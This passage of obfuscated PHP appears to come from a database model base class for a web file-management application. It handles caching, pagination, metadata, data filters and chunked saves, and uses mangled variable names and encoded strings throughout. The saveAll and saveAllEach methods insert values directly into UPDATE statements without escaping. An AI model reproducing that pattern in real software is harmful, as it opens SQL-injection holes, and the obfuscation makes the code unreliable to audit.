$Ã¦È†óÒ) { $æ´“Ÿ¤¿ = $this->cacheKeyMake($â˜ÑÒÖ¼, $Ã¦È†óÒ); Cache::remove($æ´“Ÿ¤¿); } } private function cacheKeyMake($‘µüæ®, $¶©ˆÆç®) { $…Â–Èù§ =& $_SERVER[ì™ı‰º¯]; return get_class($this) . $…Â–Èù§[11] . $‘µüæ® . $…Â–Èù§[361] . $¶©ˆÆç®; } protected function selectPageReset() { $÷ŞŸ›„ğ =& $_SERVER[ì™ı‰º¯]; if (isset($GLOBALS[$÷ŞŸ›„ğ[362]])) { return; } $GLOBALS[$÷ŞŸ›„ğ[362]] = isset($GLOBALS[$÷ŞŸ›„ğ[7]][$÷ŞŸ›„ğ[363]]) ? $GLOBALS[$÷ŞŸ›„ğ[7]][$÷ŞŸ›„ğ[363]] : !1; $GLOBALS[$÷ŞŸ›„ğ[364]] = isset($GLOBALS[$÷ŞŸ›„ğ[7]][$÷ŞŸ›„ğ[353]]) ? $GLOBALS[$÷ŞŸ›„ğ[7]][$÷ŞŸ›„ğ[353]] : !1; $GLOBALS[$÷ŞŸ›„ğ[7]][$÷ŞŸ›„ğ[363]] = !1; $GLOBALS[$÷ŞŸ›„ğ[7]][$÷ŞŸ›„ğ[353]] = !1; } protected function selectPageRestore() { $Áœ½ğ‚­ =& $_SERVER[ì™ı‰º¯]; if (!isset($GLOBALS[$Áœ½ğ‚­[362]])) { return; } $GLOBALS[$Áœ½ğ‚­[7]][$Áœ½ğ‚­[363]] = $GLOBALS[$Áœ½ğ‚­[362]]; $GLOBALS[$Áœ½ğ‚­[7]][$Áœ½ğ‚­[353]] = $GLOBALS[$Áœ½ğ‚­[364]]; if ($GLOBALS[$Áœ½ğ‚­[7]][$Áœ½ğ‚­[363]] === !1) { unset($GLOBALS[$Áœ½ğ‚­[7]][$Áœ½ğ‚­[363]]); } if ($GLOBALS[$Áœ½ğ‚­[7]][$Áœ½ğ‚­[353]] === !1) { unset($GLOBALS[$Áœ½ğ‚­[7]][$Áœ½ğ‚­[353]]); } unset($GLOBALS[$Áœ½ğ‚­[362]]); unset($GLOBALS[$Áœ½ğ‚­[364]]); } protected function selectPage($±íÆˆÉÈ = 200, $şËï÷è = 1) { $¬‡œ™şÊ =& $_SERVER[ì™ı‰º¯]; global $in; $§‡ÔŒá‰ = $this->optionsValue(); $Æ…«é«ı = 50000; $±íÆˆÉÈ = isset($in[$¬‡œ™şÊ[363]]) && $in[$¬‡œ™şÊ[363]] ? $in[$¬‡œ™şÊ[363]] : $±íÆˆÉÈ; if ($±íÆˆÉÈ === -1) { $in[$¬‡œ™şÊ[363]] = !1; $Æ…«é«ı = 100000000; $±íÆˆÉÈ = $Æ…«é«ı; } $Åòûå÷ = $§‡ÔŒá‰; $Åòûå÷[$¬‡œ™şÊ[365]] = array(); $±íÆˆÉÈ = intval($±íÆˆÉÈ); $±íÆˆÉÈ = $±íÆˆÉÈ <= 5 ? 5 : ($±íÆˆÉÈ >= $Æ…«é«ı ? $Æ…«é«ı : $±íÆˆÉÈ); $şËï÷è = intval(isset($in[$¬‡œ™şÊ[353]]) && $in[$¬‡œ™şÊ[353]] ? $in[$¬‡œ™şÊ[353]] : $şËï÷è); $şËï÷è = $şËï÷è <= 1 ? 1 : $şËï÷è; $µÉéºïÀ = array(); $İœ”õª = 1; if ($şËï÷è == 1 && $İœ”õª) { $this->optionsValue($§‡ÔŒá‰); $µÉéºïÀ = $this->page($şËï÷è, $±íÆˆÉÈ)->select(); $­¡õôçì = is_array($µÉéºïÀ) ? count($µÉéºïÀ) : 0; if ($­¡õôçì < $±íÆˆÉÈ) { $©ê»…ñ• = 1; } else { $this->optionsValue($Åòûå÷); $­¡õôçì = intval($this->count()); $©ê»…ñ• = ceil($­¡õôçì / $±íÆˆÉÈ); } } else { $this->optionsValue($Åòûå÷); $­¡õôçì = intval($this->count()); $©ê»…ñ• = ceil($­¡õôçì / $±íÆˆÉÈ); $şËï÷è = $şËï÷è >= $©ê»…ñ• ? $©ê»…ñ• : $şËï÷è; $this->optionsValue($§‡ÔŒá‰); $µÉéºïÀ = $this->page($şËï÷è, $±íÆˆÉÈ)->select(); } if (!is_array($µÉéºïÀ)) { $µÉéºïÀ = array(); } if ($©ê»…ñ• == 1) { $­¡õôçì = count($µÉéºïÀ); } $¯¼«ÃÖú = array($¬‡œ™şÊ[366] => array($¬‡œ™şÊ[367] => $­¡õôçì, $¬‡œ™şÊ[363] => $±íÆˆÉÈ, $¬‡œ™şÊ[353] => $şËï÷è, $¬‡œ™şÊ[368] => $©ê»…ñ•), $¬‡œ™şÊ[369] => $µÉéºïÀ); return $¯¼«ÃÖú; } protected function checkLength($ú£¢Ôİó, $­ÖºİÓ = 0, $Ô¶äĞ‰ = '') { $ÅÆÌñÛè =& $_SERVER[ì™ı‰º¯]; $­ÖºİÓ = $­ÖºİÓ ? $­ÖºİÓ : 65536; if (!$ú£¢Ôİó || strlen($ú£¢Ôİó) < $­ÖºİÓ) { return; } $Ô¶äĞ‰ = $Ô¶äĞ‰ ? $Ô¶äĞ‰ . $ÅÆÌñÛè[71] : $ÅÆÌñÛè[12]; show_json($Ô¶äĞ‰ . LNG($ÅÆÌñÛè[370]) . "\50{$­ÖºİÓ}\51", !1); } protected function metaSet($¦®áŒ‹, $Öä¡† = null, $Ççë›¬Í = null) { $¶…¹¥æ =& $_SERVER[ì™ı‰º¯]; if (!$this->tableMeta || !$¦®áŒ‹) { return !1; } $Û½¢˜Şö = $this->tableMeta[$¶…¹¥æ[371]]; $ñÃà‚òä = $this->tableMeta[$¶…¹¥æ[372]]; $à–©µ“Õ = Model($ñÃà‚òä); $÷÷±±•Ê = array($Û½¢˜Şö => $¦®áŒ‹, $¶…¹¥æ[373] => $Öä¡†); if (is_null($Öä¡†)) { return $à–©µ“Õ->where(array($Û½¢˜Şö => $¦®áŒ‹))->delete(); } if (is_null($Ççë›¬Í) && is_string($Öä¡†)) { return $à–©µ“Õ->where($÷÷±±•Ê)->delete(); } $ßÒŸØĞê = is_array($Öä¡†) ? $Öä¡† : array(); if (is_string($Öä¡†)) { $ßÒŸØĞê[$Öä¡†] = $Ççë›¬Í; } $üŠƒú• = array(); foreach ($ßÒŸØĞê as $ÉËÈœÙÚ => $Íñ¬À’Ã) { if (is_null($Íñ¬À’Ã) && is_string($ÉËÈœÙÚ)) { $à–©µ“Õ->where(array($Û½¢˜Şö => $¦®áŒ‹, $¶…¹¥æ[373] => $ÉËÈœÙÚ))->delete(); continue; } $this->checkLength($Íñ¬À’Ã, !1, $ñÃà‚òä . $¶…¹¥æ[4] . $ÉËÈœÙÚ); $üŠƒú•[] = array($Û½¢˜Şö => $¦®áŒ‹, $¶…¹¥æ[94] => $ÉËÈœÙÚ, $¶…¹¥æ[374] => $Íñ¬À’Ã); } $„åİÂ¬ = $¶…¹¥æ[375] . $ñÃà‚òä; CacheLock::lock($„åİÂ¬); $à–©µ“Õ->where(array($Û½¢˜Şö => $¦®áŒ‹))->addAll($üŠƒú•, array(), !0); CacheLock::unlock($„åİÂ¬); return !0; } public function metaGet($ş¤ŠÒ±, $³€áò¥Ş = false) { $üÉ½Ü…‘ =& $_SERVER[ì™ı‰º¯]; if (!$this->tableMeta) { return array(); } $¤¹Ö–¨ = $this->tableMeta[$üÉ½Ü…‘[371]]; $Ú‹ºÅÜ¢ = Model($this->tableMeta[$üÉ½Ü…‘[372]]); if ($³€áò¥Ş) { $¹ŞÀ—ƒÑ = array($¤¹Ö–¨ => $ş¤ŠÒ±, $üÉ½Ü…‘[94] => $³€áò¥Ş); return $Ú‹ºÅÜ¢->where($¹ŞÀ—ƒÑ)->getField($üÉ½Ü…‘[374]); } $¹ŞÀ—ƒÑ = array($¤¹Ö–¨ => $ş¤ŠÒ±); $¿áÏÙ— = $Ú‹ºÅÜ¢->field($üÉ½Ü…‘[376])->where($¹ŞÀ—ƒÑ)->select(); $¿áÏÙ— = array_to_keyvalue($¿áÏÙ—, $üÉ½Ü…‘[94], $üÉ½Ü…‘[374]); return $¿áÏÙ—; } private function checkDataAutoHas($ßç„çıõ) { if (!is_array($this->dataAuto) || count($this->dataAuto) == 0) { return !1; } foreach ($this->dataAuto as $ É¶ÄØØ) { if (in_array($ßç„çıõ, explode($_SERVER[ì™ı‰º¯][50], $ É¶ÄØØ[2]))) { return !0; } } return !1; } private function dataBeforeFilter(&$Òü‹Ïå, $öÔ«×ûÊ) { $ÑÖ–¾¿Ş =& $_SERVER[ì™ı‰º¯]; if (!is_array($Òü‹Ïå)) { return; } foreach ($this->dataAuto as $ÏùÕáÔ‰) { $Çğê±Óº = $ÏùÕáÔ‰[0]; if (!in_array($öÔ«×ûÊ, explode($ÑÖ–¾¿Ş[50], $ÏùÕáÔ‰[2]))) { continue; } switch (trim($ÏùÕáÔ‰[3])) { case $ÑÖ–¾¿Ş[321]: case $ÑÖ–¾¿Ş[322]: $ºó¯•¯ = $ÏùÕáÔ‰[1]; $ı±Ïîêó = isset($ÏùÕáÔ‰[4]) ? (array) $ÏùÕáÔ‰[4] : array(); if ($ºó¯•¯ == $ÑÖ–¾¿Ş[180] && array_key_exists($Çğê±Óº, $Òü‹Ïå)) { if (!$Òü‹Ïå[$Çğê±Óº]) { unset($Òü‹Ïå[$Çğê±Óº]); } break; } if (isset($Òü‹Ïå[$Çğê±Óº])) { array_unshift($ı±Ïîêó, $Òü‹Ïå[$Çğê±Óº]); } if ($ÑÖ–¾¿Ş[321] == $ÏùÕáÔ‰[3]) { $Òü‹Ïå[$Çğê±Óº] = call_user_func_array($ºó¯•¯, $ı±Ïîêó); } else { $Òü‹Ïå[$Çğê±Óº] = call_user_func_array(array(&$this, $ºó¯•¯), $ı±Ïîêó); } break; case $ÑÖ–¾¿Ş[270]: if (isset($Òü‹Ïå[$Çğê±Óº]) && $Òü‹Ïå[$Çğê±Óº]) { $Òü‹Ïå[$Çğê±Óº] = call_user_func_array(array(&$this, $ÏùÕáÔ‰[1]), array($Òü‹Ïå[$Çğê±Óº])); } break; case $ÑÖ–¾¿Ş[273]: $Òü‹Ïå[$Çğê±Óº] = $Òü‹Ïå[$ÏùÕáÔ‰[1]]; break; case $ÑÖ–¾¿Ş[294]: if (isset($Òü‹Ïå[$Çğê±Óº]) && !is_string($Òü‹Ïå[$Çğê±Óº])) { $Òü‹Ïå[$Çğê±Óº] = json_encode_force($Òü‹Ïå[$Çğê±Óº]); } break; case $ÑÖ–¾¿Ş[323]: if ($Òü‹Ïå[$Çğê±Óº] === $ÑÖ–¾¿Ş[12]) { unset($Òü‹Ïå[$Çğê±Óº]); } break; case $ÑÖ–¾¿Ş[324]: $Òü‹Ïå[$Çğê±Óº] = $ÏùÕáÔ‰[1]; default: break; } } if ($öÔ«×ûÊ == $ÑÖ–¾¿Ş[355]) { $µ’ş¬Ê = strtolower($this->db->getDbType()); if (strpos($µ’ş¬Ê, $ÑÖ–¾¿Ş[13]) !== 0) { return; } $­ÔÙ¶ºò = $this->field(!0)->fields; $âí©„—ö = $­ÔÙ¶ºò[$ÑÖ–¾¿Ş[252]]; if (isset($­ÔÙ¶ºò[$ÑÖ–¾¿Ş[251]])) { unset($âí©„—ö[$­ÔÙ¶ºò[$ÑÖ–¾¿Ş[251]]]); } foreach ($âí©„—ö as $œ¿¢“¹ƒ => $öÔ«×ûÊ) { if (!isset($Òü‹Ïå[$œ¿¢“¹ƒ])) { $Òü‹Ïå[$œ¿¢“¹ƒ] = $ÑÖ–¾¿Ş[12]; } } } } private function dataAfterFilter(&$ìÓ­Ùûî) { $÷šó‰şÇ =& $_SERVER[ì™ı‰º¯]; foreach ($this->dataAuto as $ÖÌá¬øÙ) { $–Ú‹Ç¾‚ = $ÖÌá¬øÙ[0]; if (!isset($ìÓ­Ùûî[$–Ú‹Ç¾‚])) { continue; } if (!in_array($÷šó‰şÇ[357], explode($÷šó‰şÇ[50], $ÖÌá¬øÙ[2]))) { continue; } switch (trim($ÖÌá¬øÙ[3])) { case $÷šó‰şÇ[321]: case $÷šó‰şÇ[322]: $İÙ–½¶ = isset($ÖÌá¬øÙ[4]) ? (array) $ÖÌá¬øÙ[4] : array(); array_unshift($İÙ–½¶, $ìÓ­Ùûî[$–Ú‹Ç¾‚]); if (isset($ÖÌá¬øÙ[4]) && $ÖÌá¬øÙ[4] == $÷šó‰şÇ[377]) { $İÙ–½¶ = array($ìÓ­Ùûî[$–Ú‹Ç¾‚]); } if ($÷šó‰şÇ[321] == $ÖÌá¬øÙ[3]) { $ìÓ­Ùûî[$–Ú‹Ç¾‚] = call_user_func_array($ÖÌá¬øÙ[1], $İÙ–½¶); } else { $ìÓ­Ùûî[$–Ú‹Ç¾‚] = call_user_func_array(array(&$this, $ÖÌá¬øÙ[1]), $İÙ–½¶); } break; case $÷šó‰şÇ[270]: if (isset($ìÓ­Ùûî[$–Ú‹Ç¾‚]) && $ìÓ­Ùûî[$–Ú‹Ç¾‚]) { $ìÓ­Ùûî[$–Ú‹Ç¾‚] = call_user_func_array(array(&$this, $ÖÌá¬øÙ[1]), array($ìÓ­Ùûî[$–Ú‹Ç¾‚])); } break; case $÷šó‰şÇ[273]: $ìÓ­Ùûî[$–Ú‹Ç¾‚] = $ìÓ­Ùûî[$ÖÌá¬øÙ[1]]; break; case $÷šó‰şÇ[294]: $şÕù—ú» = $ìÓ­Ùûî[$–Ú‹Ç¾‚]; $ìÓ­Ùûî[$–Ú‹Ç¾‚] = json_decode($şÕù—ú», !0); if (is_null($ìÓ­Ùûî[$–Ú‹Ç¾‚])) { $ìÓ­Ùûî[$–Ú‹Ç¾‚] = $şÕù—ú»; } break; case $÷šó‰şÇ[323]: if ($ìÓ­Ùûî[$–Ú‹Ç¾‚] === $÷šó‰şÇ[12]) { unset($ìÓ­Ùûî[$–Ú‹Ç¾‚]); } break; case $÷šó‰şÇ[324]: $ìÓ­Ùûî[$–Ú‹Ç¾‚] = $ÖÌá¬øÙ[1]; break; default: break; } } } public function saveAll($ıçÂÓû) { $Æ‡ï˜—¼ =& $_SERVER[ì™ı‰º¯]; $äÁîä¢« = $this->tablePrefix . $this->tableName; $“ú¿¬Çï = self::SQL_WHERE_IN_CHUNK; $ıçÂÓû = is_array($ıçÂÓû) ? $ıçÂÓû : array(); $ŒÃ¥êì— = $Æ‡ï˜—¼[378]; $‹â¢½Ó· = 0; $º•×±Êˆ = array(); $„ÉÏ–€ = count($ıçÂÓû); for ($„Î¸¸¤¦ = 0; $„Î¸¸¤¦ < $„ÉÏ–€; $„Î¸¸¤¦++) { $üŸ£½åù = $ıçÂÓû[$„Î¸¸¤¦]; if (!is_array($üŸ£½åù) || count($üŸ£½åù) != 4) { continue; } $ŞÉï¼šé = "\x55\120\x44\101\124\x45\x20\140{$äÁîä¢«}\x60\40\123\x45\x54\x20{$üŸ£½åù[2]}\x20\x3d\40\103\101\123\x45\40{$üŸ£½åù[0]}\x20\xa"; if ($‹â¢½Ó· == 0) { $ŒÃ¥êì— = $ŞÉï¼šé; } $º•×±Êˆ[] = $Æ‡ï˜—¼[118] . $üŸ£½åù[1] . $Æ‡ï˜—¼[118]; $‹â¢½Ó·++; $ŒÃ¥êì— .= "\x20\127\110\105\116\x20\x27{$üŸ£½åù[1]}\x27\x20\x54\x48\x45\116\40\x27{$üŸ£½åù[3]}\x27\40\12"; if ($‹â¢½Ó· == $“ú¿¬Çï || $„Î¸¸¤¦ == $„ÉÏ–€ - 1) { $ä¹â÷š– = implode($Æ‡ï˜—¼[50], $º•×±Êˆ); $ŒÃ¥êì— .= "\x20\105\x4e\104\40\40\127\x48\x45\122\105\x20{$üŸ£½åù[0]}\x20\x49\116\x20\50{$ä¹â÷š–}\51\x20"; $this->execute($ŒÃ¥êì—); $‹â¢½Ó· = 0; $ŒÃ¥êì— = $ŞÉï¼šé; $this->chunkEventCheck(count($º•×±Êˆ)); $º•×±Êˆ = array(); } } $this->chunkEventSet(); } public function saveAllEach($ïÉµöÈµ) { $•¾ğœÎ =& $_SERVER[ì™ı‰º¯]; $ı²½Šßë = $this->tablePrefix . $this->tableName; foreach ($ïÉµöÈµ as $ÒÄÕ¯ŠÚ) { if (!is_array($ÒÄÕ¯ŠÚ) || count($ÒÄÕ¯ŠÚ) != 4) { continue; } $ßÁ”ğ¼ç = $ÒÄÕ¯ŠÚ[0] . $•¾ğœÎ[379] . $ÒÄÕ¯ŠÚ[1] . $•¾ğœÎ[118]; $§•Ï§– = $ÒÄÕ¯ŠÚ[2] . $•¾ğœÎ[379] . $ÒÄÕ¯ŠÚ[3] . $•¾ğœÎ[118]; $Û‡±éŞ = "\165\160\x64\x61\164\145\40{$ı²½Šßë}\40\163\x65\164\x20{$§•Ï§–}\40\167\x68\145\162\x65\x20{$ßÁ”ğ¼ç}\73"; $this->execute($Û‡±éŞ); } } protected $_chunkEvent = false; protected $_chunkEventParam = false; public function chunkEventSet($¬ÒÚÌŸä = false, $ÍşÙâ•ò = false) { $this->_chunkEvent = $¬ÒÚÌŸä; $this->_chunkEventParam = $ÍşÙâ•ò; } private function chunkEventCheck($¯©‘ó­) { if (!$this->_chunkEvent) { return; } $¨ß‘¢“ = is_array($this->_chunkEventParam) ? $this->_chunkEventParam : array(); $¨ß‘¢“[$_SERVER[ì™ı‰º¯][380]] = $¯©‘ó­; Hook::trigger($this->_chunkEvent, $¨ß‘¢“); } public function addAll($ÀÑ•å¥Ô, $İóË•ƒ = array(), $ÉØÖõá = false) { $ùÓßÏ Ú =& $_SERVER[ì™ı‰º¯]; ignore_timeout(); $ùùªüÃ¬ = self::SQL_WHERE_IN_CHUNK; if (empty($ÀÑ•å¥Ô)) { $this->error = think_lang($ùÓßÏ Ú[271]); return !1; } $İóË•ƒ = $this->_parseOptions($İóË•ƒ); foreach ($ÀÑ•å¥Ô as $ «£°Ì => $Æõ¸Í’…) { $ÀÑ•å¥Ô[$ «£°Ì] = $this->_facade($Æõ¸Í’…); $this->_beforeInsert($ÀÑ•å¥Ô[$ «£°Ì], $İóË•ƒ); } if (method_exists($this->db, $ùÓßÏ Ú[272])) { for ($Èşˆ¥„ë = 0; $Èşˆ¥„ë < count($ÀÑ•å¥Ô); $Èşˆ¥„ë += $ùùªüÃ¬) { $¿÷ƒ€É = array_slice($ÀÑ•å¥Ô, $Èşˆ¥„ë, $ùùªüÃ¬); if (!is_array($¿÷ƒ€É) || count($¿÷ƒ€É) == 0) { break; } $ßã›ŠÙÈ = $this->db->insertAll($¿÷ƒ€É, $İóË•ƒ, $ÉØÖõá); $this->chunkEventCheck(count($¿÷ƒ€É)); } $this->chunkEventSet(); } else { $this->startTrans(); foreach ($ÀÑ•å¥Ô as $ «£°Ì => $Æõ¸Í’…) { $ßã›ŠÙÈ = $this->db->insert($Æõ¸Í’…, $İóË•ƒ, $ÉØÖõá); } $this->commit(); } if (!1 !== $ßã›ŠÙÈ) { $úóÛ©ç– = $this->getLastInsID(); if ($úóÛ©ç–) { return $úóÛ©ç–; } } return $ßã›ŠÙÈ; } public function save($ÚÕÚèÎ„ = '', $Ğıƒ¨´Õ = array()) { $Â¡½­¶ø =& $_SERVER[ì™ı‰º¯]; $ÒØÜ»òÁ = self::SQL_WHERE_IN_CHUNK; $¡¿½Óú = $this->optionsValue(); $Ò›Å‡÷¦ = $this->findWhereField($¡¿½Óú); if (!$Ò›Å‡÷¦) { return parent::save($ÚÕÚèÎ„, $Ğıƒ¨´Õ); } $¨¬åæšÆ = 0; $ïÏ§€€Ù = $¡¿½Óú[$Â¡½­¶ø[275]][$Ò›Å‡÷¦][1]; $ïÏ§€€Ù = is_array($ïÏ§€€Ù) ? $ïÏ§€€Ù : array(); $„¤­äÀë = count($ïÏ§€€Ù); for ($£ú„ƒ = 0; $£ú„ƒ < $„¤­äÀë; $£ú„ƒ += $ÒØÜ»òÁ) { $à¦ïü¡¨ = array_slice($ïÏ§€€Ù, $£ú„ƒ, $ÒØÜ»òÁ); if (!is_array($à¦ïü¡¨) || count($à¦ïü¡¨) == 0) { break; } $¡¿½Óú[$Â¡½­¶ø[275]][$Ò›Å‡÷¦][1] = $à¦ïü¡¨; $this->optionsValue($¡¿½Óú); $¨¬åæšÆ += parent::save($ÚÕÚèÎ„, $Ğıƒ¨´Õ); $this->chunkEventCheck(count($à¦ïü¡¨)); } $this->chunkEventSet(); return $¨¬åæšÆ; } public function add($Í¡ûôµ¥ = '', $¢óĞ÷Şä = array(), $øãÉğ¸š = false) { if ($this->addTaskStatus && is_array($Í¡ûôµ¥)) { $this->addTaskData[] = $Í¡ûôµ¥; return; } return parent::add($Í¡ûôµ¥, $¢óĞ÷Şä, $øãÉğ¸š); } public function parseWhereLike($ùúäÛí, $ìÜ²§· = '', $Ú¼¾Æ› = false, &$³îùè‘ = false) { $ô¦¸¹Ö¼ =& $_SERVER[ì™ı‰º¯]; $Àª¢’§ = $GLOBALS[$ô¦¸¹Ö¼[6]][$ô¦¸¹Ö¼[381]]; if (!$Àª¢’§[$ô¦¸¹Ö¼[382]]) { return $ùúäÛí; } if (!is_array($ùúäÛí)) { return $ùúäÛí; } $§°ğ§¡– = array(); $ÆæÉ©ûŒ = 0; foreach ($ùúäÛí as $ô¡‹© => $“¶ñº¨) { if (is_array($“¶ñº¨) && count($“¶ñº¨) == 2 && $“¶ñº¨[0] == $ô¦¸¹Ö¼[383] && is_string($“¶ñº¨[1]) && substr($“¶ñº¨[1], 0, 1) == $ô¦¸¹Ö¼[384] && substr($“¶ñº¨[1], strlen($“¶ñº¨[1]) - 1, 1) == $ô¦¸¹Ö¼[384]) { $³îùè‘ = !0; $Ö¹÷îĞ = is_string($ô¡‹©) ? $ô¡‹© : $ìÜ²§·; $Å¡öÕÄÜ = substr($“¶ñº¨[1], 1, strlen($“¶ñº¨[1]) - 2); $Å¡öÕÄÜ = $this->db->escapeString($Å¡öÕÄÜ); if (!strpos($Ö¹÷îĞ, $ô¦¸¹Ö¼[10])) { $Ö¹÷îĞ = $ô¦¸¹Ö¼[385] . $Ö¹÷îĞ . $ô¦¸¹Ö¼[385]; } $©‡Œ¶›¯ = $ô¦¸¹Ö¼[189] . $Å¡öÕÄÜ . $ô¦¸¹Ö¼[189]; $Å¡öÕÄÜ = str_replace(array($ô¦¸¹Ö¼[10], $ô¦¸¹Ö¼[386], $ô¦¸¹Ö¼[11]), $ô¦¸¹Ö¼[387], $Å¡öÕÄÜ); if ($Àª¢’§[$ô¦¸¹Ö¼[388]]) { $©‡Œ¶›¯ = $ô¦¸¹Ö¼[389] . $Å¡öÕÄÜ . $ô¦¸¹Ö¼[390]; if ($Àª¢’§[$ô¦¸¹Ö¼[391]]) { $©‡Œ¶›¯ = $ô¦¸¹Ö¼[390] . $Å¡öÕÄÜ . $ô¦¸¹Ö¼[389]; } } $§°ğ§¡–[$ÆæÉ©ûŒ] = $ô¦¸¹Ö¼[392] . $Ö¹÷îĞ . $ô¦¸¹Ö¼[393] . $©‡Œ¶›¯ . $ô¦¸¹Ö¼[394]; $ÆæÉ©ûŒ++; continue; } if (is_array($“¶ñº¨)) { $ìÜ²§· = is_string($ô¡‹©) ? $ô¡‹© : $ìÜ²§·; $“¶ñº¨ = $this->parseWhereLike($“¶ñº¨, $ìÜ²§·, !0, $³îùè‘); } if (is_numeric($ô¡‹©)) { $§°ğ§¡–[$ÆæÉ©ûŒ] = $“¶ñº¨; $ÆæÉ©ûŒ++; } else { $§°ğ§¡–[$ô¡‹©] = $“¶ñº¨; } } if ($³îùè‘ && !$Ú¼¾Æ›) { } return $§°ğ§¡–; } private $addTaskStatus = false; private $addTaskData = array(); public function addTaskStart() { $this->addTaskStatus = !0; $this->addTaskData = array(); } public function addTaskEnd() { if (!$this->addTaskStatus) { return; } $this->addAll($this->addTaskData); $this->addTaskStatus = !1; $this->addTaskData = array(); } public function select($Ğí¥Ö—‘ = array()) { $úİò¹Î =& $_SERVER[ì™ı‰º¯]; $“ÀÊ¥£ = self::SQL_WHERE_IN_CHUNK; $Ë€×¨Ï¬ = $this->optionsValue(); $ÉåÌĞ¢ğ = $this->findWhereField($Ë€×¨Ï¬); if (!$ÉåÌĞ¢ğ || isset($Ë€×¨Ï¬[$úİò¹Î[292]]) || isset($Ë€×¨Ï¬[$úİò¹Î[353]])) { return parent::select($Ğí¥Ö—‘); } $ƒÀÌ‹õÎ = $Ë€×¨Ï¬[$úİò¹Î[275]][$ÉåÌĞ¢ğ][1]; $ƒÀÌ‹õÎ = is_array($ƒÀÌ‹õÎ) ? $ƒÀÌ‹õÎ : array(); $é¹ÛÑÏô = null; for ($üá³‘¹¢ = 0; $üá³‘¹¢ < count($ƒÀÌ‹õÎ); $üá³‘¹¢ += $“ÀÊ¥£) { $®¨Ùê° = array_slice($ƒÀÌ‹õÎ, $üá³‘¹¢, $“ÀÊ¥£); if (!is_array($®¨Ùê°) || count($®¨Ùê°) == 0) { break; } $Ë€×¨Ï¬[$úİò¹Î[275]][$ÉåÌĞ¢ğ][1] = $®¨Ùê°; $this->optionsValue($Ë€×¨Ï¬); $úÔìä¾À = parent::select($Ğí¥Ö—‘); if (!$úÔìä¾À) { continue; } $é¹ÛÑÏô = is_array($é¹ÛÑÏô) ? $é¹ÛÑÏô : array(); $é¹ÛÑÏô = array_merge($é¹ÛÑÏô, $úÔìä¾À); } return $é¹ÛÑÏô; } public function delete($‹­È À¼ = array()) { $ß‘¿‚ÑÈ =& $_SERVER[ì™ı‰º¯]; $ûÕ‹´¯Ô = self::SQL_WHERE_IN_CHUNK; $À×àïø­ = $this->optionsValue(); $Íáéâ° = $this->findWhereField($À×àïø­); if (!$Íáéâ°) { return parent::delete($‹­È À¼); } $¿Æ¤·àë = 0; $å‰Çõ³— = $À×àïø­[$ß‘¿‚ÑÈ[275]][$Íáéâ°][1]; $å‰Çõ³— = is_array($å‰Çõ³—) ? $å‰Çõ³— : array(); for ($Ÿ€ßëª = 0; $Ÿ€ßëª < count($å‰Çõ³—); $Ÿ€ßëª += $ûÕ‹´¯Ô) { $Ä“Éğ«• = array_slice($å‰Çõ³—, $Ÿ€ßëª, $ûÕ‹´¯Ô); if (!is_array($Ä“Éğ«•) || count($Ä“Éğ«•) == 0) { break; } $À×àïø­[$ß‘¿‚ÑÈ[275]][$Íáéâ°][1] = $Ä“Éğ«•; $this->optionsValue($À×àïø­); $¿Æ¤·àë += parent::delete($‹­È À¼); } return $¿Æ¤·àë; } private function findWhereField($õÛ½êã•) { $†ƒ›ş  =& $_SERVER[ì™ı‰º¯]; $Ëğ˜ë¾‚ = self::SQL_WHERE_IN_CHUNK; if (!is_array($õÛ½êã•) || !is_array($õÛ½êã•[$†ƒ›ş [275]])) { return !1; } foreach ($õÛ½êã•[$†ƒ›ş [275]] as $éÛ–½®Ê => $¼Úòë²à) { if (is_array($¼Úòë²à) && isset($¼Úòë²à[0]) && is_string($¼Úòë²à[0]) && strtolower($¼Úòë²à[0]) == $†ƒ›ş [7] && is_array($¼Úòë²à[1]) && count($¼Úòë²à[1]) > $Ëğ˜ë¾‚) { ignore_timeout(); return $éÛ–½®Ê; } } return !1; } public function setMasterDB($”Ş¿ğ ş = true) { think_config($_SERVER[ì™ı‰º¯][395], $”Ş¿ğ ş); } } class ModelBaseLight { public $optionType = ''; public $modelType = "\123\171\x73\x74\145\155\x4f\160\x74\x69\x6f\156"; public $field = array(); public function listData($¸ÜËµü½ = false, $ñÂÄÙõ‡ = "\155\x6f\144\151\x66\171\x54\x69\155\x65", $¸ùÄğÁ­ = false) { $û•Ş×—Â = Model($this->modelType)->get(!1, $this->optionType, !0); $ãáÖ€ê = array_values($û•Ş×—Â); if ($ãáÖ€ê && $ãáÖ€ê[0] && !is_array($ãáÖ€ê[0])) { Model($this->modelType)->cacheRemove($this->optionType); $û•Ş×—Â = Model($this->modelType)->get(!1, $this->optionType, !0); } if (!$û•Ş×—Â) { return $¸ÜËµü½ ? null : array(); } if (!$¸ÜËµü½) { $û•Ş×—Â = array_filter(array_values($û•Ş×—Â)); return array_sort_by($û•Ş×—Â, $ñÂÄÙõ‡, $¸ùÄğÁ­); } return $û•Ş×—Â[$_SERVER[ì™ı‰º¯][396] . $¸ÜËµü½]; } public function insert($Ÿ÷Ó™èÉ) { $’ŠÄˆÂ… =& $_SERVER[ì™ı‰º¯]; $Ÿ÷Ó™èÉ = array_field_key($Ÿ÷Ó™èÉ, $this->field); $Ôğè‘µ = Model($this->modelType)->get($’ŠÄˆÂ…[397], $this->optionType . $’ŠÄˆÂ…[398]); $Ôğè‘µ = $Ôğè‘µ ? $Ôğè‘µ : 0; $Ÿ÷Ó™èÉ[$’ŠÄˆÂ…[399]] = ++$Ôğè‘µ; $Ÿ÷Ó™èÉ[$’ŠÄˆÂ…[201]] = time(); $Ÿ÷Ó™èÉ[$’ŠÄˆÂ…[85]] = time(); Model($this->modelType)->set($’ŠÄˆÂ…[397], $Ôğè‘µ, $this->optionType . $’ŠÄˆÂ…[398]); Model($this->modelType)->set($’ŠÄˆÂ…[396] . $Ôğè‘µ, $Ÿ÷Ó™èÉ, $this->optionType); return $Ôğè‘µ; } public function update($àº¿ŞÁ¥, $ó¤Ë›) { $ÅêßÀ =& $_SERVER[ì™ı‰º¯]; $ó¤Ë› = array_field_key($ó¤Ë›, $this->field); $É¶ğ‹™ë = $this->listData($àº¿ŞÁ¥); if (!$É¶ğ‹™ë || !$àº¿ŞÁ¥) { return !1; } $ó¤Ë› = array_merge($É¶ğ‹™ë, $ó¤Ë›); $ó¤Ë›[$ÅêßÀ[85]] = time(); return Model($this->modelType)->set($ÅêßÀ[396] . $àº¿ŞÁ¥, $ó¤Ë›, $this->optionType); } public function remove($’‡‚³şµ) { if (!$’‡‚³şµ) { return !1; } return Model($this->modelType)->remove($_SERVER[ì™ı‰º¯][396] . $’‡‚³şµ, $this->optionType); } public function 